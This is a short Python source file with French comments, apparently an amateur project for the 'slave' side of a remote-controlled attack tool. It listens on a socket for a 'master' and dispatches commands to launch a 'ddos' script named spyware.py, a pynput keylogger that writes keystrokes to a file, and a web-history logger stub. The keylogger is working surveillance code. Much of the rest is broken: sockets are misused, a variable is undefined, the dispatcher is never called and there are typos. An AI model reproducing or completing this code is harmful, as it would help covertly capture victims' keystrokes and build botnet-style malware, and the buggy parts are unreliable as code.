#IL S'AGIT DU SERVEUR, CELUI QUI ECOUTE

#modules
import socket
import os
from datetime import datetime
from logging.handlers import RotatingFileHandler
from pynput.keyboard import Key, Listener
import logging

#création du soket
s = socket.socket(socket .AF_INET, socket .SOCK_STREAM)

#notre programme malveillant va être lié à l'adresse du maître
#ainsi qu'à un port spécifique
s.bind(("192.168.56.1", 60000))
print("Esclave connecté")

#une fois connecté, on le met en écoute afin qu'il reçoive
# #les instructions du maître
s. listen()
print("Esclave en écoute")

#on doit accepter la connexion pour échanger des messages
distant_socket, addr = s.accept()
print("Connexion acceptée")

#doit envoyer la valeur contenue dans la variable au maître, mais ne fonctionne pas
#ip = socket.gethostbyname(socket.gethostname())
#distant_socket.send(ip)

#fonction pour lancer l'attaque ddos
def ddos(server_addr):
        print("signal reçu")
        os.system("spyware.py")
        s.send(b"Ok c'est fait")

#fonction pour lancer le keylogger
def keylogger():
    print("keylogger lancé")
    log_dir = r"C:"
    logging.basicConfig(filename=(log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    def on_press(key):
        logging.info(str(key))
    with Listener(on_press=on_press) as listener:
        listener.join()

#fonction pour lancer le logger historique
def historiqueWeb():
    logging.basicConfig(filename='keyboardactivity.log', lebel=logging.DEBUG)

#choix de l'attaque en fonction du message reçu
def choix_attaque():
    attaque = s.recv(1024)
    if (attaque == b"ddos") :
        return ddos(server_add)
    elif (attaque == b"keylogger"):
        return keylogger()
    elif (attaque == b"historique"):
        return historiqueWeb()

#fonction pour lancer le logging







